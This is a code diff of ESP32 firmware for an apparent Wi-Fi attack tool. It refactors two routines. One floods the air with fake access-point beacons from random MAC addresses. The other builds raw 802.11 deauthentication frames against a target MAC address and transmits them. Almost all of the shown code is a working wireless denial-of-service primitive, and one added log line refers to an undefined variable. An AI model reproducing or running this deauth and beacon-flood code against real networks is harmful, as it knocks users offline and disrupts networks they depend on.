@@ -15,14 +15,13 @@ public:
 			this->ap_config.ap.channel = current_channel;
 			this->ap_config.ap.beacon_interval = 10000;
 			this->ap_config.ap.ssid_len = 0;
-
-			esp_wifi_set_promiscuous(true);
 					
 			esp_wifi_init(&cfg);
 			esp_wifi_set_storage(WIFI_STORAGE_RAM);
 			esp_wifi_set_mode(WIFI_MODE_AP);
 			esp_wifi_set_config(WIFI_IF_AP, &ap_config);
 			esp_wifi_start();
+			// esp_wifi_set_ps(WIFI_PS_NONE);
 			esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
 			// switchChannel();
 			return true;
@@ -75,7 +74,7 @@ public:
 			String name = String("FS | ") + generateRandomString(10);
 			// createAccessPoint(name.c_str(), "");
 			createAndBroadcastBeacon(name);
-			l.log(Logger::INFO, String("Creating access point: ") + name);
+			delay(100);
 		}
 	}
 
@@ -202,12 +201,15 @@ private:
 	}
 
 	void createAndBroadcastBeacon(String ssid) {
-		// Calculate the length of the SSID (including '\n') and set it in the beacon frame.
-		switchChannel();
 		int ssidLen = ssid.length();
+		if (ssidLen > 32) 
+			return;
+
+		switchChannel();
 		beaconPacket[38] = static_cast<uint8_t>(ssidLen);
 
 		uint8_t* macAddr = randomMacAddress();
+
 		// Write MAC address into the beacon frame
 		memcpy(&beaconPacket[10], macAddr, 6);
 		memcpy(&beaconPacket[16], macAddr, 6);
@@ -222,35 +224,37 @@ private:
 
 		int packetCounter = 0;
 		// Send the beacon frame multiple times for better broadcasting.
-		for (int i = 0; i < 3; i++) {
-			packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), 0) == 0;
-			delay(1);
-		}
+		packetCounter += esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, sizeof(beaconPacket), 0) == 0;
+		// for (int i = 0; i < 3; i++) {
+		// 	delay(1);
+		// }
+		l.log(Logger::INFO, String("Creating access point: ") + name);
 	}
 
-	void sendDeauthPacket(const char *targetMAC)
+	void sendDeauthPacket(const char* mac)
 	{
-		uint8_t packet[26] = {
-			0xc0, 0x00, 0x3a, 0x01,
-			0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-			0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-			0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-			0xf0, 0xff, 0x02, 0x00
-		};
-
-		// Generate a random MAC address for the sender
-		randomMacAddress(packet + 4);
+		// uint8_t* macAddr = randomMacAddress();
 
 		// Copy the target MAC address into the packet
-		memcpy(&packet[10], targetMAC, 6);
-
-		WiFi.disconnect();
-		delay(100);
-		WiFi.mode(WIFI_STA);
+		uint8_t deauth_packet[sizeof(deauthPacket)];
+		memcpy(deauth_packet, deauthPacket, sizeof(deauthPacket));
+		memcpy(&deauth_packet[10], mac, 6);
+		memcpy(&deauth_packet[16], mac, 6);
+		// WiFi.disconnect();
+		// delay(100);
+		// WiFi.mode(WIFI_STA);
 		delay(100);
 		// wifi_send_pkt_freedom(packet, sizeof(packet), 0);
-		esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
+		esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauthPacket), false);
 	}
+
+	uint8_t deauthPacket[26] = {
+		0xc0, 0x00, 0x3a, 0x01,
+		0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0xf0, 0xff, 0x02, 0x00
+	};
 
 	uint8_t beaconPacket[128] = { 
 		0x80, 0x00, 0x00, 0x00, //Frame Control, Duration
